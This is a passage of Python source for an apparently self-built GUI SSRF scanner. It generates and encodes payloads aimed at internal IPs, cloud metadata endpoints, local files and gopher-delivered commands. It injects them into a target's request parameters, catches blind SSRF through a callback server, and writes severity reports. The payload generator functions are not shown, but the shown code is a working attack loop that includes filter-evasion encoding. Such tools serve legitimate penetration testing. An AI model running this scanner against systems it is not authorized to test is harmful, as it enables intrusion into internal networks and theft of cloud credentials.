                 base_payloads.append({"type": "controlled", "url": controlled_target_url_for_injection})

            if test_internal:
                self.gui_update_queue.put(("log", f"[*] Generating internal IP payloads for ports: {internal_ports}"))
                for payload_url in generate_internal_ip_payloads(internal_ports):
                     base_payloads.append({"type": "internal", "url": payload_url})


            if test_cloud:
                self.gui_update_queue.put(("log", "[*] Generating cloud metadata endpoint payloads"))
                for payload_url in generate_cloud_metadata_payloads():
                     base_payloads.append({"type": "cloud_metadata", "url": payload_url})


            if test_file:
                self.gui_update_queue.put(("log", "[*] Generating file access payloads"))
                for payload_url in generate_file_access_payloads():
                     base_payloads.append({"type": "file_access", "url": payload_url})

            # Gopher payload generation
            if test_gopher:
                 gopher_commands_list = gopher_commands # Already processed in start_scan
                 self.gui_update_queue.put(("log", f"[*] Generating Gopher payloads for {gopher_ip}:{gopher_port} with commands: {gopher_commands_list}"))
                 for payload_url in generate_gopher_payloads(gopher_ip, gopher_port, gopher_commands_list):
                     # Store extra info for Gopher payloads
                     base_payloads.append({"type": "gopher", "url": payload_url, "target_ip": gopher_ip, "target_port": gopher_port, "commands": gopher_commands_list})


            if not base_payloads:
                self.gui_update_queue.put(("log", "[-] No payloads specified. Please select payload options."))
                self.update_status("Scan finished: No payloads to test.")
                return

            # 4. Apply encoding techniques to base payloads
            payloads_to_test = []
            if selected_encoding_techniques:
                 self.gui_update_queue.put(("log", f"[*] Applying encoding techniques: {', '.join(selected_encoding_techniques)}"))
            else:
                 self.gui_update_queue.put(("log", "[*] No encoding techniques selected."))


            for base_payload_obj in base_payloads:
                 original_url = base_payload_obj["url"]
                 encoded_urls = apply_encoding_techniques(original_url, selected_encoding_techniques)
                 for encoded_url in encoded_urls:
                      encoded_payload_obj = base_payload_obj.copy()
                      encoded_payload_obj["url"] = encoded_url
                      if encoded_url != original_url:
                           encoded_payload_obj["encoding_techniques"] = selected_encoding_techniques # Note: this will show all selected techniques, not just the one that resulted in this specific URL
                      else:
                           encoded_payload_obj["encoding_techniques"] = []

                      payloads_to_test.append(encoded_payload_obj)

                      # If using generate-id, map the encoded URL with the ID to the original payload info
                      if test_controlled and generate_id and encoded_payload_obj.get("type") == "controlled":
                           parsed_encoded_url = urlparse(encoded_url)
                           encoded_path_segments = parsed_encoded_url.path.split('/')
                           found_encoded_id = None
                           for segment in encoded_path_segments:
                               try:
                                   uuid.UUID(segment)
                                   found_encoded_id = segment
                                   break
                               except ValueError:
                                   pass
                           if found_encoded_id:
                               with unique_id_lock:
                                   unique_id_to_payload[found_encoded_id] = encoded_payload_obj
                           else:
                                encoded_query_params = parse_qs(parsed_encoded_url.query)
                                if 'id' in encoded_query_params and encoded_query_params['id']:
                                     potential_encoded_id = encoded_query_params['id'][0]
                                     with unique_id_lock:
                                         unique_id_to_payload[potential_encoded_id] = encoded_payload_obj


            self.gui_update_queue.put(("log", f"[*] Total unique payloads to test after encoding: {len(payloads_to_test)}"))


            # 5. Run the SSRF tests
            self.update_status("Sending test requests...")
            self.gui_update_queue.put(("log", "\n[*] Sending test requests..."))

            for method in methods:
                for param in parameters:
                    for payload_obj in payloads_to_test:
                        if method.upper() != "GET" and (payload_obj.get("type") == "file_access" or payload_obj.get("type") == "gopher"):
                            # self.gui_update_queue.put(("log", f"[-] Skipping {method} for {payload_obj.get('type')} payload: {payload_obj.get('url')}"))
                            continue

                        finding_from_response = test_ssrf_vulnerability(
                            target_url,
                            param,
                            payload_obj,
                            method=method,
                            retries=retries,
                            delay=delay,
                            proxies=request_proxies
                        )
                        if finding_from_response:
                             self.add_finding_to_gui(finding_from_response)


            self.gui_update_queue.put(("log", "\n[*] All test requests sent."))
            if test_controlled:
                 self.gui_update_queue.put(("log", "[*] Waiting briefly for potential delayed responses to controlled target..."))


            # 6. Wait briefly for requests to the controlled target and process them (only if controlled target was tested)
            if test_controlled:
                try:
                    # Wait for a period that should cover potential delays and retries
                    wait_time = timeout + delay * retries + 5
                    self.gui_update_queue.put(("log", f"[*] Waiting for {wait_time} seconds for controlled target responses..."))
                    time.sleep(wait_time) # Simple sleep for now
                    self.gui_update_queue.put(("log", "[*] Processing received requests on controlled target..."))
                    while not request_queue.empty():
                         request_info = request_queue.get_nowait()
                         finding = analyze_request(request_info)
                         self.add_finding_to_gui(finding)
                         request_queue.task_done()

                except queue.Empty:
                     pass
                except Exception as e:
                     logging.error(f"Error processing controlled target queue: {e}")


            # 7. Report the findings
            self.update_status("Generating report...")
            self.gui_update_queue.put(("log", "\n" + "="*50))
            self.gui_update_queue.put(("log", " SSRF SCAN REPORT"))
            self.gui_update_queue.put(("log", "="*50))

            if not self.all_findings:
                self.gui_update_queue.put(("log", "No potential SSRF vulnerabilities detected."))
            else:
                # Generate text report in the results text area
                self.gui_update_queue.put(("log", f"Found {len(self.all_findings)} potential SSRF vulnerabilities:"))
                self.gui_update_queue.put(("log", "-" * 50))

                findings_by_severity = {}
                for finding in self.all_findings:
                    severity = finding["severity"]
                    if severity not in findings_by_severity:
                        findings_by_severity[severity] = []
                    findings_by_severity[severity].append(finding)

                severity_order = ["Critical", "High", "Low"]

                for severity in severity_order:
                    if severity in findings_by_severity:
                        self.gui_update_queue.put(("log", f"\n{severity} Severity Findings:"))
                        for i, finding in enumerate(findings_by_severity[severity]):
                            self.gui_update_queue.put(("log", f"  {i+1}. [{finding['timestamp']}]"))
                            self.gui_update_queue.put(("log", f"     Severity: {finding['severity']}"))
                            self.gui_update_queue.put(("log", f"     Description: {finding['description']}"))
                            if finding.get('target_url'):
                                 self.gui_update_queue.put(("log", f"     Target URL: {finding['target_url']}"))
                                 self.gui_update_queue.put(("log", f"     Parameter: {finding['param_name']}"))
                                 self.gui_update_queue.put(("log", f"     Method Used: {finding['method_used']}"))

                            if finding['unique_id_match']:
                                self.gui_update_queue.put(("log", "     (Detected via Unique ID Match - likely Blind SSRF)"))
                                self.gui_update_queue.put(("log", f"     Controlled Target IP: {finding['client_ip']}"))
                                self.gui_update_queue.put(("log", f"     Controlled Target Path: {finding['path']}"))
                                self.gui_update_queue.put(("log", f"     Controlled Target Method: {finding['method']}"))
                            elif finding.get('target_response_status'):
                                 self.gui_update_queue.put(("log", f"     Target Response Status: {finding['target_response_status']}"))
                                 self.gui_update_queue.put(("log", f"     Target Response Snippet: {finding['target_response_body_snippet']}..."))

                            if finding['matched_payload']:
                                 self.gui_update_queue.put(("log", f"     Injected Payload: {finding['matched_payload']['url']}"))
                                 if finding['matched_payload'].get('type') == 'gopher':
                                      self.gui_update_queue.put(("log", f"     Gopher Target: {finding['matched_payload'].get('target_ip')}:{finding['matched_payload'].get('target_port')}"))
                                      self.gui_update_queue.put(("log", f"     Gopher Commands: {', '.join(finding['matched_payload'].get('commands', []))}"))
                                 if finding['matched_payload'].get('encoding_techniques'):
                                      self.gui_update_queue.put(("log", f"     Encoding Techniques Applied: {', '.join(finding['matched_payload']['encoding_techniques'])}"))

                            self.gui_update_queue.put(("log", "-" * 20))

                self.gui_update_queue.put(("log", "="*50))

            self.update_status("Scan finished.")


        except Exception as e:
            logging.error(f"[-] An unexpected error occurred during scan: {e}")
            import traceback
            logging.error(traceback.format_exc())
            self.update_status(f"Scan failed: {e}")
        finally:
            # Ensure the controlled server is stopped after the scan finishes
            if self.controlled_server:
                 self.gui_update_queue.put(("log", "[*] Stopping controlled target..."))
                 self.controlled_server.shutdown()
                 self.controlled_server.server_close()
                 self.gui_update_queue.put(("log", "[*] Controlled target stopped."))
                 self.controlled_server = None # Reset the server reference


    def save_report(self):
        if not self.all_findings:
            messagebox.showinfo("Save Report", "No findings to save.")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[
                ("Text files", "*.txt"),
                ("JSON files", "*.json"),
                ("CSV files", "*.csv"),
                ("All files", "*.*"),
            ],
            title="Save SSRF Report"
        )

        if not file_path:
            return # User cancelled

        try:
            output_format = "text"
            if file_path.lower().endswith(".json"):
                output_format = "json"
            elif file_path.lower().endswith(".csv"):
                output_format = "csv"

            report_content = report_findings(self.all_findings, output_format=output_format)

            with open(file_path, 'w', newline='') as f: # Use newline='' for CSV
                f.write(report_content)

            messagebox.showinfo("Save Report", f"Report saved successfully to {file_path}")

        except Exception as e:
            messagebox.showerror("Save Report Error", f"Error saving report: {e}")
            logging.error(f"Error saving report: {e}")


    def on_closing(self):
        """Handle the window closing event."""
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            # Signal the server thread to stop if it's running
            stop_server_event.set()
            self.master.destroy()
            sys.exit(0) # Ensure the application exits cleanly

# --- Custom Logging Handler for GUI ---
class GuiHandler(logging.Handler):
    def __init__(self, gui_instance):
        super().__init__()
        self.gui_instance = gui_instance

    def emit(self, record):
        log_entry = self.format(record)
        self.gui_instance.log_to_gui(log_entry)


# --- Main Execution Block (modified for GUI) ---
if __name__ == "__main__":
    # Remove argparse as GUI handles input
    # parser = argparse.ArgumentParser(...)
    # args = parser.parse_args()

    root = tk.Tk()
    app = SSRFGui(root)

    # Add the custom logging handler to the root logger
    gui_handler = GuiHandler(app)
    logging.getLogger().addHandler(gui_handler)

    root.mainloop()
